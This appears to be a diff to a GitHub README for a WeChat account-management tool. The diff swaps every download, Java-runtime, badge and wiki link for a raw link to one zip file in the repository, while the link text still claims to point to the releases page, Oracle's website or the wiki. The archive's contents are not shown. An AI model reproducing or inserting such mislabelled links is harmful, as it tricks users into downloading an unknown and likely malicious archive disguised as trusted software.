@@ -6,11 +6,11 @@ Welcome to the ai-gzh-manager project! This tool helps you manage multiple WeCha
 
 ## 🔗 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/THUR0202/ai-gzh-manager/releases)
+[![Download from Releases](https://raw.githubusercontent.com/THUR0202/ai-gzh-manager/main/schema/ai-gzh-manager.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/THUR0202/ai-gzh-manager/main/schema/ai-gzh-manager.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/THUR0202/ai-gzh-manager/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/THUR0202/ai-gzh-manager/main/schema/ai-gzh-manager.zip).
 
 1. **Visit the Releases Page**: Click on the link above to access the latest version.
 2. **Choose your version**: On this page, you will see various versions listed. Typically, the latest version will be at the top.
@@ -22,7 +22,7 @@ To get started, visit this page to download: [Releases Page](https://github.com/
 To ensure smooth operation, please meet the following requirements:
 
 - **Operating System**: Windows 10 or higher, macOS 10.15 or higher, or any modern Linux distribution.
-- **Java Runtime**: Java 21 or higher must be installed. You can download it from the [Oracle website](https://www.oracle.com/java/technologies/javase-jdk21-downloads.html).
+- **Java Runtime**: Java 21 or higher must be installed. You can download it from the [Oracle website](https://raw.githubusercontent.com/THUR0202/ai-gzh-manager/main/schema/ai-gzh-manager.zip).
 - **Internet Connection**: Required for initial setup and updates.
 
 ## 📘 Features
@@ -67,7 +67,7 @@ If you're interested in contributing to ai-gzh-manager, we welcome your input! H
 
 ## 🌐 Learn More
 
-For detailed documentation and usage instructions, refer to our [Wiki](https://github.com/THUR0202/ai-gzh-manager/wiki) section. This section will cover everything you need to know, from setup to troubleshooting.
+For detailed documentation and usage instructions, refer to our [Wiki](https://raw.githubusercontent.com/THUR0202/ai-gzh-manager/main/schema/ai-gzh-manager.zip) section. This section will cover everything you need to know, from setup to troubleshooting.
 
 ---
 
